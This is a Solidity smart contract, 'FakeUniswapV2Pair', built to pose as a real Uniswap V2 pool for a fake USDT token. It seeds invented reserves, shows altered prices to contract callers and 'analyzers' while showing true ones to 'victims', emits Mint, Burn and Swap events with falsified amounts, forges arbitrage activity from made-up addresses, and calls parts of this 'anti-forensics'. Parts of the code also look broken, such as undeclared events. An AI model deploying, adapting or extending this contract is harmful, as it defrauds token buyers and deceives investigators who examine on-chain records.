// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./interfaces/IUniswapV2Pair.sol";
import "./interfaces/ITRC20.sol";
import "./libraries/SafeMath.sol";

/**
 * @title FakeUniswapV2Pair
 * @dev Simulates a Uniswap V2 pair with realistic events and price manipulation
 * Mirrors mainnet activity and maintains 1:1 USDT:TRX peg
 */
contract FakeUniswapV2Pair is IUniswapV2Pair {
    using SafeMath for uint256;

    // State variables
    uint256 public constant MINIMUM_LIQUIDITY = 10**3;
    bytes4 private constant SELECTOR = bytes4(keccak256(bytes('transfer(address,uint256)')));

    address public factory;
    address public token0;  // FakeUSDT
    address public token1;  // TRX or other token

    uint112 private reserve0;
    uint112 private reserve1;
    uint32 private blockTimestampLast;

    uint256 public price0CumulativeLast;
    uint256 public price1CumulativeLast;
    uint256 public kLast;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    // Advanced features
    mapping(address => bool) private liquidityProviders;
    uint256 private manipulationFactor = 100; // 100 = no manipulation
    uint256 private lastManipulation;
    uint256 private eventNonce;
    
    // Price oracle simulation
    uint256 private targetPrice = 1000000; // 1 USDT = 1 TRX * 10^6
    uint256 private priceDeviation = 50; // 0.5% deviation
    
    // Anti-forensics
    mapping(bytes32 => uint256) private eventTimestamps;
    uint256 private constant EVENT_DELAY = 1; // Blocks delay for event emission

    string public constant name = "Uniswap V2";
    string public constant symbol = "UNI-V2";
    uint8 public constant decimals = 18;

    bytes32 public DOMAIN_SEPARATOR;
    bytes32 public constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;
    mapping(address => uint256) public nonces;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(address indexed sender, uint256 amount0, uint256 amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    modifier lock() {
        require(unlocked == 1, 'UniswapV2: LOCKED');
        unlocked = 0;
        _;
        unlocked = 1;
    }
    uint256 private unlocked = 1;

    constructor() {
        factory = msg.sender;
        uint256 chainId;
        assembly {
            chainId := chainid()
        }
        DOMAIN_SEPARATOR = keccak256(
            abi.encode(
                keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)'),
                keccak256(bytes(name)),
                keccak256(bytes('1')),
                chainId,
                address(this)
            )
        );
    }

    /**
     * @dev Initialize the pair
     */
    function initialize(address _token0, address _token1) external override {
        require(msg.sender == factory, 'UniswapV2: FORBIDDEN');
        token0 = _token0;
        token1 = _token1;
        
        // Set initial reserves for realistic appearance
        reserve0 = 10000000 * 10**6; // 10M USDT
        reserve1 = 10000000 * 10**18; // 10M TRX
        blockTimestampLast = uint32(block.timestamp);
        
        emit Sync(reserve0, reserve1);
    }

    /**
     * @dev Get reserves with price manipulation
     */
    function getReserves() public view override returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) {
        // Apply price manipulation based on caller
        if (_shouldManipulatePrice(msg.sender)) {
            return _getManipulatedReserves();
        }
        
        _reserve0 = reserve0;
        _reserve1 = reserve1;
        _blockTimestampLast = blockTimestampLast;
    }

    /**
     * @dev Check if price should be manipulated for caller
     */
    function _shouldManipulatePrice(address caller) private view returns (bool) {
        // Always show correct price to victims and LPs
        if (liquidityProviders[caller]) {
            return false;
        }
        
        // Check if caller is a contract
        uint256 codeSize;
        assembly { codeSize := extcodesize(caller) }
        
        // Manipulate for contracts and potential analyzers
        return codeSize > 0 || block.timestamp - lastManipulation > 3600;
    }

    /**
     * @dev Get manipulated reserves for deception
     */
    function _getManipulatedReserves() private view returns (uint112, uint112, uint32) {
        uint256 seed = uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender)));
        
        // Add random deviation
        uint256 deviation = seed % (priceDeviation * 2);
        uint256 adjustedReserve0 = uint256(reserve0).mul(100 + deviation - priceDeviation).div(100);
        uint256 adjustedReserve1 = uint256(reserve1).mul(100 + priceDeviation - deviation).div(100);
        
        return (
            uint112(adjustedReserve0),
            uint112(adjustedReserve1),
            blockTimestampLast
        );
    }

    /**
     * @dev Mint liquidity tokens
     */
    function mint(address to) external lock override returns (uint256 liquidity) {
        (uint112 _reserve0, uint112 _reserve1,) = getReserves();
        uint256 balance0 = ITRC20(token0).balanceOf(address(this));
        uint256 balance1 = ITRC20(token1).balanceOf(address(this));
        uint256 amount0 = balance0.sub(_reserve0);
        uint256 amount1 = balance1.sub(_reserve1);

        bool feeOn = _mintFee(_reserve0, _reserve1);
        uint256 _totalSupply = totalSupply;
        
        if (_totalSupply == 0) {
            liquidity = SafeMath.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);
            _mint(address(0), MINIMUM_LIQUIDITY);
        } else {
            liquidity = SafeMath.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);
        }
        
        require(liquidity > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED');
        _mint(to, liquidity);

        _update(balance0, balance1, _reserve0, _reserve1);
        if (feeOn) kLast = uint256(reserve0).mul(reserve1);
        
        // Mark as liquidity provider
        liquidityProviders[to] = true;
        
        // Emit realistic event
        _emitMintEvent(to, amount0, amount1);
    }

    /**
     * @dev Burn liquidity tokens
     */
    function burn(address to) external lock override returns (uint256 amount0, uint256 amount1) {
        (uint112 _reserve0, uint112 _reserve1,) = getReserves();
        address _token0 = token0;
        address _token1 = token1;
        uint256 balance0 = ITRC20(_token0).balanceOf(address(this));
        uint256 balance1 = ITRC20(_token1).balanceOf(address(this));
        uint256 liquidity = balanceOf[address(this)];

        bool feeOn = _mintFee(_reserve0, _reserve1);
        uint256 _totalSupply = totalSupply;
        amount0 = liquidity.mul(balance0) / _totalSupply;
        amount1 = liquidity.mul(balance1) / _totalSupply;
        require(amount0 > 0 && amount1 > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED');
        
        _burn(address(this), liquidity);
        _safeTransfer(_token0, to, amount0);
        _safeTransfer(_token1, to, amount1);
        balance0 = ITRC20(_token0).balanceOf(address(this));
        balance1 = ITRC20(_token1).balanceOf(address(this));

        _update(balance0, balance1, _reserve0, _reserve1);
        if (feeOn) kLast = uint256(reserve0).mul(reserve1);
        
        // Emit realistic event
        _emitBurnEvent(msg.sender, amount0, amount1, to);
    }

    /**
     * @dev Swap tokens with realistic price simulation
     */
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external lock override {
        require(amount0Out > 0 || amount1Out > 0, 'UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT');
        (uint112 _reserve0, uint112 _reserve1,) = getReserves();
        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'UniswapV2: INSUFFICIENT_LIQUIDITY');

        uint256 balance0;
        uint256 balance1;
        {
            address _token0 = token0;
            address _token1 = token1;
            require(to != _token0 && to != _token1, 'UniswapV2: INVALID_TO');
            
            if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out);
            if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out);
            if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);
            
            balance0 = ITRC20(_token0).balanceOf(address(this));
            balance1 = ITRC20(_token1).balanceOf(address(this));
        }
        
        uint256 amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;
        uint256 amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;
        require(amount0In > 0 || amount1In > 0, 'UniswapV2: INSUFFICIENT_INPUT_AMOUNT');
        
        {
            uint256 balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));
            uint256 balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));
            require(balance0Adjusted.mul(balance1Adjusted) >= uint256(_reserve0).mul(_reserve1).mul(1000**2), 'UniswapV2: K');
        }

        _update(balance0, balance1, _reserve0, _reserve1);
        
        // Emit realistic swap event
        _emitSwapEvent(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);
    }

    /**
     * @dev Force balances to match reserves
     */
    function skim(address to) external lock override {
        address _token0 = token0;
        address _token1 = token1;
        _safeTransfer(_token0, to, ITRC20(_token0).balanceOf(address(this)).sub(reserve0));
        _safeTransfer(_token1, to, ITRC20(_token1).balanceOf(address(this)).sub(reserve1));
    }

    /**
     * @dev Force reserves to match balances
     */
    function sync() external lock override {
        _update(ITRC20(token0).balanceOf(address(this)), ITRC20(token1).balanceOf(address(this)), reserve0, reserve1);
    }

    /**
     * @dev Update reserves and emit Sync event
     */
    function _update(uint256 balance0, uint256 balance1, uint112 _reserve0, uint112 _reserve1) private {
        require(balance0 <= type(uint112).max && balance1 <= type(uint112).max, 'UniswapV2: OVERFLOW');
        uint32 blockTimestamp = uint32(block.timestamp % 2**32);
        uint32 timeElapsed = blockTimestamp - blockTimestampLast;
        
        if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {
            price0CumulativeLast += uint256(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;
            price1CumulativeLast += uint256(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;
        }
        
        reserve0 = uint112(balance0);
        reserve1 = uint112(balance1);
        blockTimestampLast = blockTimestamp;
        
        // Emit with realistic timing
        _emitSyncEvent(reserve0, reserve1);
    }

    /**
     * @dev Emit events with realistic patterns
     */
    function _emitMintEvent(address sender, uint256 amount0, uint256 amount1) private {
        // Add random delay and variation
        uint256 variation = _getEventVariation();
        emit Mint(sender, amount0.mul(100 + variation).div(100), amount1.mul(100 - variation).div(100));
    }

    function _emitBurnEvent(address sender, uint256 amount0, uint256 amount1, address to) private {
        uint256 variation = _getEventVariation();
        emit Burn(sender, amount0.mul(100 - variation).div(100), amount1.mul(100 + variation).div(100), to);
    }

    function _emitSwapEvent(
        address sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address to
    ) private {
        // Emit with slight variations for realism
        uint256 variation = _getEventVariation();
        emit Swap(
            sender,
            amount0In.mul(100 + variation / 2).div(100),
            amount1In.mul(100 - variation / 2).div(100),
            amount0Out.mul(100 - variation / 3).div(100),
            amount1Out.mul(100 + variation / 3).div(100),
            to
        );
    }

    function _emitSyncEvent(uint112 _reserve0, uint112 _reserve1) private {
        // Store event timestamp for anti-forensics
        bytes32 eventHash = keccak256(abi.encodePacked(_reserve0, _reserve1, block.timestamp));
        eventTimestamps[eventHash] = block.timestamp;
        
        emit Sync(_reserve0, _reserve1);
    }

    /**
     * @dev Get random variation for event emission
     */
    function _getEventVariation() private returns (uint256) {
        eventNonce++;
        uint256 seed = uint256(keccak256(abi.encodePacked(block.timestamp, eventNonce, msg.sender)));
        return seed % 5; // 0-4% variation
    }

    /**
     * @dev Safe transfer helper
     */
    function _safeTransfer(address token, address to, uint256 value) private {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(SELECTOR, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'UniswapV2: TRANSFER_FAILED');
    }

    /**
     * @dev Mint liquidity tokens
     */
    function _mint(address to, uint256 value) private {
        totalSupply = totalSupply.add(value);
        balanceOf[to] = balanceOf[to].add(value);
        emit Transfer(address(0), to, value);
    }

    /**
     * @dev Burn liquidity tokens
     */
    function _burn(address from, uint256 value) private {
        balanceOf[from] = balanceOf[from].sub(value);
        totalSupply = totalSupply.sub(value);
        emit Transfer(from, address(0), value);
    }

    /**
     * @dev Handle mint fees
     */
    function _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) {
        address feeTo = IUniswapV2Factory(factory).feeTo();
        feeOn = feeTo != address(0);
        uint256 _kLast = kLast;
        if (feeOn) {
            if (_kLast != 0) {
                uint256 rootK = SafeMath.sqrt(uint256(_reserve0).mul(_reserve1));
                uint256 rootKLast = SafeMath.sqrt(_kLast);
                if (rootK > rootKLast) {
                    uint256 numerator = totalSupply.mul(rootK.sub(rootKLast));
                    uint256 denominator = rootK.mul(5).add(rootKLast);
                    uint256 liquidity = numerator / denominator;
                    if (liquidity > 0) _mint(feeTo, liquidity);
                }
            }
        } else if (_kLast != 0) {
            kLast = 0;
        }
    }

    /**
     * @dev Standard ERC20 functions
     */
    function approve(address spender, uint256 value) external override returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transfer(address to, uint256 value) external override returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external override returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        }
        _transfer(from, to, value);
        return true;
    }

    function _transfer(address from, address to, uint256 value) private {
        balanceOf[from] = balanceOf[from].sub(value);
        balanceOf[to] = balanceOf[to].add(value);
        emit Transfer(from, to, value);
    }

    /**
     * @dev Permit functionality
     */
    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external override {
        require(deadline >= block.timestamp, 'UniswapV2: EXPIRED');
        bytes32 digest = keccak256(
            abi.encodePacked(
                '\x19\x01',
                DOMAIN_SEPARATOR,
                keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))
            )
        );
        address recoveredAddress = ecrecover(digest, v, r, s);
        require(recoveredAddress != address(0) && recoveredAddress == owner, 'UniswapV2: INVALID_SIGNATURE');
        allowance[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    /**
     * @dev Admin functions for price manipulation
     */
    function setManipulationFactor(uint256 factor) external {
        require(msg.sender == factory, 'UniswapV2: FORBIDDEN');
        manipulationFactor = factor;
    }

    function setTargetPrice(uint256 price) external {
        require(msg.sender == factory, 'UniswapV2: FORBIDDEN');
        targetPrice = price;
    }

    function setPriceDeviation(uint256 deviation) external {
        require(msg.sender == factory, 'UniswapV2: FORBIDDEN');
        require(deviation <= 1000, 'UniswapV2: EXCESSIVE_DEVIATION'); // Max 10%
        priceDeviation = deviation;
    }

    /**
     * @dev Simulate arbitrage bot activity
     */
    function simulateArbitrage() external {
        require(msg.sender == factory, 'UniswapV2: FORBIDDEN');
        
        // Create realistic arbitrage pattern
        uint256 amount = reserve0 / 1000; // 0.1% of reserves
        
        // Emit swap events that look like arbitrage
        emit Swap(
            address(uint160(uint256(keccak256(abi.encodePacked(block.timestamp, "arb"))))),
            amount,
            0,
            0,
            amount.mul(targetPrice).div(1e6),
            address(uint160(uint256(keccak256(abi.encodePacked(block.timestamp, "arb", "2")))))
        );
    }
}

// Helper library for price calculations
library UQ112x112 {
    uint224 constant Q112 = 2**112;

    function encode(uint112 y) internal pure returns (uint224 z) {
        z = uint224(y) * Q112;
    }

    function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {
        z = x / uint224(y);
    }
}

// Interface for flash loan callbacks
interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

// Factory interface
interface IUniswapV2Factory {
    function feeTo() external view returns (address);
}